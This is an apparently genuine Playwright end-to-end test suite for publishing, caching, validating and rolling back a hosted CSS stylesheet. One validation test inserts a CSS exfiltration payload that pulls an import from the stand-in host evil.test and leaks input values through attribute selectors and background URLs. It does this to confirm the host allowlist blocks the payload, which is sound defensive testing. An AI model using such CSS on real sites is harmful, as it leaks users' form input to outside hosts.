import { expect, test, type Page } from "@playwright/test";

import { createLibrary, signIn } from "./helpers";

const FIXTURE_ORIGIN = "http://127.0.0.1:4399";

/**
 * Publishing reaches a real Cloudflare Worker and real R2, so these are slower
 * than the rest of the suite and the edge holds `latest.css` for `s-maxage=10`.
 */
test.describe.configure({ mode: "serial", timeout: 180_000 });

/** Edit the accent by driving the CSS panel, which is the authoritative source. */
async function setAccent(page: Page, hex: string): Promise<void> {
  const editor = page.getByTestId("live-css-source");
  const css = await editor.inputValue();
  await editor.fill(css.replace(/(--one-accent-color:\s*)#[0-9a-f]{6};/i, `$1${hex};`));
  await expect(page.getByTestId("save-state")).toHaveAttribute("data-state", "saved", {
    timeout: 30_000,
  });
}

async function publish(page: Page): Promise<void> {
  await page.getByTestId("open-publish").click();
  await expect(page.getByTestId("publish-panel")).toBeVisible();
  await page.getByTestId("publish-button").click();
  await expect(page.getByTestId("state-pill")).toContainText("Published", { timeout: 90_000 });
}

/**
 * Wait out the edge cache on `latest.css`.
 *
 * `s-maxage=10` is a real product decision, not a test artifact — see
 * `services/src/shared/headers.ts` — so the test waits it out rather than
 * pretending publishes are instant everywhere.
 */
async function waitForEdge(): Promise<void> {
  await new Promise((resolve) => setTimeout(resolve, 13_000));
}

test.describe("publishing", () => {
  test("a clean customer page picks up the stylesheet after a refresh", async ({ page, browser }) => {
    await signIn(page, `publish-${Date.now()}@example.com`);
    await createLibrary(page);

    await setAccent(page, "#123456");
    await publish(page);

    const installUrl = (await page.getByTestId("install-snippet").textContent())!
      .match(/href="([^"]+)"/)![1]!;

    expect(installUrl).toContain("/ds1/");
    expect(installUrl).toMatch(/\/latest\.css$/);

    await waitForEdge();

    // A fresh context with no cookies, no storage, nothing from the workbench.
    const context = await browser.newContext();
    const customer = await context.newPage();
    await customer.goto(`${FIXTURE_ORIGIN}/customer.html?css=${encodeURIComponent(installUrl)}`);
    await customer.waitForFunction(() => document.styleSheets.length > 0, { timeout: 30_000 });

    // The page has exactly one stylesheet and no script, so this can only pass
    // if the hosted artifact is doing the work.
    const inventory = await customer.evaluate(() => ({
      scripts: document.querySelectorAll("script").length,
      inlineStyles: document.querySelectorAll("style").length,
      sheets: document.querySelectorAll("link[rel=stylesheet]").length,
    }));
    expect(inventory).toEqual({ scripts: 0, inlineStyles: 0, sheets: 1 });

    const decoration = await customer
      .locator("a, button")
      .first()
      .evaluate((node) => getComputedStyle(node).borderRadius);
    expect(decoration).toBe("4px");

    const accent = await customer.evaluate(() =>
      getComputedStyle(document.documentElement).getPropertyValue("--one-accent-color").trim(),
    );
    expect(accent).toBe("#123456");

    await context.close();
  });

  test("an already-open page is not restyled until it reloads", async ({ page, browser }) => {
    await signIn(page, `restyle-${Date.now()}@example.com`);
    await createLibrary(page);

    await setAccent(page, "#111111");
    await publish(page);

    const installUrl = (await page.getByTestId("install-snippet").textContent())!
      .match(/href="([^"]+)"/)![1]!;
    await waitForEdge();

    const context = await browser.newContext();
    const customer = await context.newPage();
    await customer.goto(`${FIXTURE_ORIGIN}/customer.html?css=${encodeURIComponent(installUrl)}`);
    await customer.waitForFunction(() => document.styleSheets.length > 0, { timeout: 30_000 });

    const readAccent = () =>
      customer.evaluate(() =>
        getComputedStyle(document.documentElement).getPropertyValue("--one-accent-color").trim(),
      );

    expect(await readAccent()).toBe("#111111");

    // Publish a second version while that page stays open. The panel is
    // already open from the first publish — clicking `open-publish` again would
    // toggle it shut.
    await setAccent(page, "#222222");
    await page.getByTestId("publish-button").click();
    await expect(page.getByTestId("state-pill")).toContainText("Published", { timeout: 90_000 });
    await waitForEdge();

    // Still the old value: an open page is never restyled underneath the user.
    expect(await readAccent()).toBe("#111111");

    await customer.reload();
    await customer.waitForFunction(() => document.styleSheets.length > 0, { timeout: 30_000 });
    expect(await readAccent()).toBe("#222222");

    await context.close();
  });

  test("a failed validation leaves the live stylesheet byte-identical", async ({ page, request }) => {
    await signIn(page, `invalid-${Date.now()}@example.com`);
    await createLibrary(page);

    await setAccent(page, "#0abcde");
    await publish(page);

    const installUrl = (await page.getByTestId("install-snippet").textContent())!
      .match(/href="([^"]+)"/)![1]!;
    await waitForEdge();

    const before = await (await request.get(installUrl)).text();

    // The exfiltration pattern the host allowlist exists to stop.
    const editor = page.getByTestId("live-css-source");
    await editor.fill(
      `@import url("http://evil.test/x.css");\ninput[value^="a"]{background:url(https://evil.test/leak)}\n${await editor.inputValue()}`,
    );
    await expect(page.getByTestId("save-state")).toHaveAttribute("data-state", "saved", {
      timeout: 30_000,
    });

    await expect(page.getByTestId("validation-issue").first()).toBeVisible();
    await expect(page.getByTestId("publish-button")).toBeDisabled();

    const codes = await page.getByTestId("validation-issue").locator("code").allTextContents();
    expect(codes).toContain("disallowed_import_host");
    expect(codes).toContain("disallowed_url_host");

    await waitForEdge();
    const after = await (await request.get(installUrl)).text();
    expect(after).toBe(before);
    expect(after).not.toContain("evil.test");
  });

  test("rollback reverts the live stylesheet and keeps every version reachable", async ({
    page,
    request,
  }) => {
    await signIn(page, `rollback-${Date.now()}@example.com`);
    await createLibrary(page);

    await setAccent(page, "#aa0000");
    await publish(page);
    const installUrl = (await page.getByTestId("install-snippet").textContent())!
      .match(/href="([^"]+)"/)![1]!;

    await setAccent(page, "#00aa00");
    await page.getByTestId("publish-button").click();
    await expect(page.getByTestId("state-pill")).toContainText("v2", { timeout: 90_000 });

    await waitForEdge();
    expect(await (await request.get(installUrl)).text()).toContain("#00aa00");

    page.once("dialog", (dialog) => void dialog.accept());
    await page.getByTestId("rollback-1").click();
    await expect(page.getByTestId("state-pill")).toContainText("v1", { timeout: 90_000 });

    await waitForEdge();
    const live = await (await request.get(installUrl)).text();
    expect(live).toContain("#aa0000");

    // Rollback repoints; it does not destroy. v2 is still at its own URL.
    const v2 = await request.get(installUrl.replace("latest.css", "v/2.css"));
    expect(v2.status()).toBe(200);
    expect(await v2.text()).toContain("#00aa00");
  });
});
